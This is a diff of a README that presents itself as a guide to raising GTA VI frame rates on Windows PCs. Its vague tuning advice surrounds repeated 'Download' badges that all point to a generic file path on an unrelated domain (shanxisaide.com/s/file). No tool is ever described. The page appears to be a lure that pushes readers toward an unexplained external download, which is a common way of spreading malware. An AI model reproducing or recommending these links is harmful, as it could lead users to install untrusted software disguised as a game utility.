@@ -1,7 +1,7 @@
 
 # Boost GTA VI frame rate on a Windows PC
 
-[![Download](https://img.shields.io/badge/Download-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)
+[![Download](https://img.shields.io/badge/Download-GTA%20VI%20FPS-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)
 
 ## Fast GTA VI Frame Rate Brief
 
@@ -33,8 +33,6 @@ Readers weighing options usually compare a driver-level frame cap with the in-ga
 
 Keep one plain baseline configuration written down before you start. Without it, three changes later you cannot tell which one helped, and reverting means guessing.
 
-[![Download](https://img.shields.io/badge/Download-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)
-
 ## Getting Started Playbook
 
 Begin with a repeatable route: a fixed drive through a busy district at a set time of day, played for about three minutes. Rebuild the same conditions for every pass, and record frametimes rather than watching an average counter. Note the display refresh and the resolution before anything else.
@@ -52,8 +50,6 @@ Scenario B - Downtown density: test a crowd-heavy street twice to separate simul
 Scenario C - Laptop on battery: repeat the route on mains power to see how much of the shortfall was power management  
 Scenario D - After a game patch: re-run the saved route before restoring an old settings file wholesale  
 
-[![Download](https://img.shields.io/badge/Download-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)
-
 ## Setup Checklist
 
 | Check | What to prepare |
@@ -69,7 +65,7 @@ Scenario D - After a game patch: re-run the saved route before restoring an old 
 
 Open the setup page and review the options covered here. Check which constraints apply to the hardware you already have, then measure your own route before adopting a figure from someone else's machine.
 
-[![Download](https://img.shields.io/badge/Download-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)
+[![Download](https://img.shields.io/badge/Download-GTA%20VI%20FPS-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)
 
 ## Troubleshooting Common Issues
 
